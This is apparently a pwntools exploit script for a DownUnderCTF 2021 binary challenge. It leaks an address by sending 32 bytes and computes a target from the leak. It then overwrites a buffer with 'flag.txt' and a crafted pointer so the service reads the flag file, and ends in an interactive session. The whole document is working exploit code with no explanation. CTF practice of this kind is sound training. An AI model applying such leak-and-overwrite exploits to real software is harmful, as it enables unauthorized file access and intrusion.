from pwn import *

p = remote('pwn-2021.duc.tf', 31907)

p.recv()
p.send(b'a'*32)

p.recv()
p.sendline(b'2')

p.recvuntil(b'a'*32)

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(leak))

name_addr = leak + 0x207c

p.recv()
p.sendline(b'1')

p.recv()
p.send(b'flag.txt' + p64(0)*3 + p64(name_addr))

p.recv()
p.sendline(b'1337')

p.recv()
p.sendline(b'1413698884')


p.interactive()